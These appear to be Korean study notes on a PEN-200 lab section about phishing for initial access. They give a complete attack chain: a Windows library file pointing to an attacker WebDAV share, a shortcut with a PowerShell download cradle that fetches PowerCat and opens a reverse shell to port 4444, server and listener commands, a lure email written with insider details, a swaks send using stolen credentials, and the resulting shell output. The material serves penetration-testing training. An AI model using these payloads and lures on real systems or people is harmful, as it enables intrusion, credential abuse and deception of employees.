# 27.3.2 피싱을 통한 접근

> **Phishing for Access** · PEN-200 §27.3.2

내부 머신·인프라 정보가 전혀 없는 상태 → 클라이언트 사이드 공격 두 갈래(매크로가 든 Office 문서 / Windows 라이브러리 파일 + 바로가기) 중 **후자**를 택함. 대상에 Office 가 설치돼 있다는 보장이 없어서임.

준비물 넷 — WebDAV 서버(80), PowerCat 배포용 Python3 웹서버(8000), 리버스셸 수신용 Netcat(4444), 그리고 라이브러리·바로가기 파일.

*WebDAV 루트를 익명 읽기·쓰기로 80 포트에 게시*

라이브러리 파일은 WINPREP 에 RDP(`offsec` / `lab`)로 붙어 `config.Library-ms` 로 작성함. `<url>` 이 Kali 를 가리켜야 피해자의 탐색기가 우리 WebDAV 공유를 펼침.

```
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.119.5</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

*WebDAV 공유로 연결시키는 Windows 라이브러리 정의*

바로가기는 같은 데스크톱에서 New > Shortcut 으로 만들고, 대상에 아래 명령을 넣음 — 다운로드 크래들로 PowerCat 을 메모리에 올린 뒤 곧바로 리버스셸을 붙이는 구조임.

```
powershell.exe -c "IEX(New-Object
System.Net.WebClient).DownloadString('http://192.168.119.5:8000/powercat.ps1');
powercat -c 192.168.119.5 -p 4444 -e powershell"
```

*바로가기가 실행할 PowerCat 리버스셸*

두 파일을 Kali 로 옮기되 바로가기는 WebDAV 디렉터리에 두고, PowerCat 은 바로가기가 지정한 8000 포트로 따로 서빙함. WebDAV 한 곳으로도 되지만 포트를 나누면 운신 폭이 넓어짐.

```
kali@kali:~/beyond$ cp /usr/share/powershell-
empire/empire/server/data/module_source/management/powercat.ps1 .
kali@kali:~/beyond$ python3 -m http.server 8000
```

*PowerCat 을 8000 포트로 서빙*

```
kali@kali:~/beyond$ nc -nvlp 4444
listening on [any] 4444 ...
```
*리버스셸 수신용 리스너를 4444 에 띄워 둠 — 메일 발송 전에 먼저 올려야 함*

메일 본문은 대상 개인 정보가 없어 일반적인 문구로 씀. 다만 WEBSRV1 의 Git 저장소에서 얻은 스테이징 스크립트 얘기를 끼워 **직원만 알 법한 사실**을 심음 — 첨부를 열 확률을 크게 올리는 지점임. 실제 진단이라면 수동적 정보수집으로 더 맞춤형 미끼를 만들 것.

```
Hey!
I checked WEBSRV1 and discovered that the previously used staging script still exists
in the Git logs. I'll remove it for security reasons.
On an unrelated note, please install the new security features on your workstation.
For this, download the attached file, double-click on it, and execute the
configuration shortcut within. Thanks!
John
```

*첨부 실행을 유도하는 미끼 본문(body.txt)*

발송은 명령줄 SMTP 시험 도구 `swaks` 로 함. 수신자 `-t`(marcus·daniela), 봉투 발신자 `--from`, 첨부 `--attach`, 제목·본문 `--header`·`--body`, 메일 서버 `--server`, `--suppress-data` 로 SMTP 트랜잭션 요약, `-ap` 로 비밀번호 인증 → 앞서 확보한 `john` 자격 증명을 입력함.

```
kali@kali:~/beyond$ sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from
john@beyond.com --attach @config.Library-ms --server 192.168.50.242 --body @body.txt -
-header "Subject: Staging Script" --suppress-data -ap
```

*리스너가 연결을 받아 PowerShell 배너가 뜸 — 피해자가 바로가기를 실행했다는 신호임*

```
PS C:\Windows\System32\WindowsPowerShell\v1.0> whoami
whoami
beyond\marcus
PS C:\Windows\System32\WindowsPowerShell\v1.0> hostname
hostname
CLIENTWK1
PS C:\Windows\System32\WindowsPowerShell\v1.0> ipconfig
ipconfig
Windows IP Configuration
Ethernet adapter Ethernet0:
   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 172.16.6.243
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.6.254
PS C:\Windows\System32\WindowsPowerShell\v1.0>
```
*입력이 두 번 찍히는 것은 에코 없는 원시 셸이라서임*

`whoami` · `hostname` · `ipconfig` 로 확인한 결과는 `beyond\marcus` / `CLIENTWK1` / `172.16.6.243`(마스크 255.255.255.0, 게이트웨이 172.16.6.254) → 내부 대역에 발판 확보. IP·서브넷·게이트웨이는 그 자리에서 작업 디렉터리에 기록할 것.
